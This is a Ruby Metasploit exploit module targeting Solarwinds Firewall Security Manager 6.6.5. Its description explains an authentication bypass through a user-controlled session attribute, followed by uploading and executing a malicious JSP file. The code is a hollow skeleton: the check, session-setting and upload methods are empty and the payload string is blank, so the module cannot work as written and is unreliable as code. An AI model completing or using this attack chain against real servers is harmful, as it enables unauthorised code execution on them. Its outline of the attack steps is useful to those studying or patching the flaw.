##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::EXE

  def initialize(info={})
    super(update_info(info,
      'Name'           => "Solarwinds Firewall Security Manager 6.6.5 Client Session Handling Vulnerability",
      'Description'    => %q{
        This module exploits multiple vulnerabilities found in Solarwinds Firewall Security Manager
        6.6.5. The first vulnerability is an authentication bypass via the Change Advisor interface
        due to a user-controlled session.putValue API in userlogin.jsp, allowing the attacker to set
        the 'username' attribute before authentication. The second problem is that the settings-new.jsp
        file will only check the 'username' attribute for 'uploadFile' action's authorization, which
        can be exploited and allows the attacker to upload a malicious file to the server, and results
        in arbitrary code execution.

        Depending on the installation, by default the Change Advisor web server is listening on port
        48080 for an express install. Otherwise, this service may appear on port 8080.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'rgod',  # Original discovery
          'sinn3r' # Metasploit
        ],
      'References'     =>
        [
          ['OSVDB', '81634'],
        ],
      'Payload'        =>
        {
          'BadChars' => "\x00",
        },
      'DefaultOptions'  =>
        {
          'EXITFUNC' => "none",
          'RPORT'    => 48080
        },
      'Platform'       => 'win',
      'Targets'        =>
        [
          ['Solarwinds Firewall Security Manager 6.6.5', {}]
        ],
      'Privileged'     => false,
      'DisclosureDate' => "Mar 13 2015",
      'DefaultTarget'  => 0))
  end


  # Returns a checkcode that indicates whether the target is FSM or not
  def check
  end


  # Creates an arbitrary username by abusing the server's unsafe use of session.putValue
  def put_session_value(value)
  end


  # Uploads a malicious JSP file and then execute it
  def upload_exec(filename, malicious_file)
  end

  # Exploit/run command
  def exploit
    unless check == Exploit::CheckCode::Detected
      print_error("Target does not appear to be a Solarwinds Firewall Security Manager")
      return
    end

    username = 'admin'
    print_status("Putting session value: #{username}")
    put_session_value('admin')

    filename = "test.jsp"
    malicious_file = ''
    print_status("Uploading file: #{filename}")
    upload_exec(filename, malicious_file)
  end
end
